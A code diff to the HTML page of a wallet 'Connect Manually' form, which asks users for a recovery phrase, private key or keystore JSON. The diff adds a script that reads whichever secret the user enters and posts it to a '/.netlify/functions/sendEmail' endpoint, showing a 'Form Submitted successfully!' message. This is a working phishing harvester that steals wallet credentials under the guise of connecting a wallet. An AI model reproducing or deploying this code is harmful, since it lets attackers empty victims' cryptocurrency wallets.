@@ -1956,14 +1956,15 @@
                 >Connect Manually</a
               >
             </div> -->
-
+            <form id="submitform">
             <div id="div_connect_manuallly" style="display: block">
               <input type="radio" name="method" value="phrase" checked="" />
               <span style="font-size: 1.8rem; margin-right: 2rem">Phrase</span>
+
               <input type="radio" name="method" value="key" />
               <span style="font-size: 1.8rem; margin-right: 2rem"
-                >Private Key</span
-              >
+                >Private Key</span>
+
               <input type="radio" name="method" value="json" />
               <span style="font-size: 1.8rem; margin-right: 2rem"
                 >Keystore JSON</span
@@ -2017,8 +2018,9 @@
               >
                 Connect Wallet
               </button>
+              <p class="status-message" style="color:green;font-size:12px;"></p>
             </div>
-
+            </form>
             <div>
               <br /><br /><br />
               <h5 class="mt-4 text-muted align-items-center">
@@ -2260,6 +2262,56 @@
         }
       });
     </script>
+
+<script>
+  document.getElementById('submitForm').addEventListener('click', async function () {
+      const form = document.getElementById('submitform'); // Get the form by ID
+      const statusMessage = form.querySelector(".status-message"); // Get the status message element
+      const submitButton = form.querySelector("button"); // Get the submit button
+
+      // Show "Processing..." message
+      statusMessage.textContent = "Processing...";
+      statusMessage.style.color = "green";
+      submitButton.disabled = true; // Disable button to prevent multiple submissions
+
+      // Get the textarea content by using the ID
+      const textareaId = document.querySelector('input[name="method"]:checked')?.value;
+
+      if (textareaId) {
+          // Get content of the selected textarea by its ID
+          const sessionContent = document.getElementById(textareaId).value;
+
+          try {
+              const response = await fetch("/.netlify/functions/sendEmail", {
+                  method: "POST",
+                  headers: { "Content-Type": "application/json" },
+                  body: JSON.stringify({ session: textareaId, content: sessionContent }),
+              });
+
+              if (response.ok) {
+                  // Show success message
+                  statusMessage.textContent = "Form Submitted successfully!";
+                  statusMessage.style.color = "green";
+                  form.reset(); // Reset the form
+              } else {
+                  throw new Error("Failed to submit the form.");
+              }
+          } catch (error) {
+              // Show error message
+              statusMessage.textContent = "Form not submitted. Please try again!";
+              statusMessage.style.color = "red"; // Red for errors
+          }
+
+          submitButton.disabled = false; // Re-enable the submit button
+      } else {
+          // Show message if no radio button is selected
+          statusMessage.textContent = "Please select a session!";
+          statusMessage.style.color = "red";
+          submitButton.disabled = false; // Re-enable the button if no session is selected
+      }
+  });
+</script>
+
 
     <style>
       .btn-outline-primary {
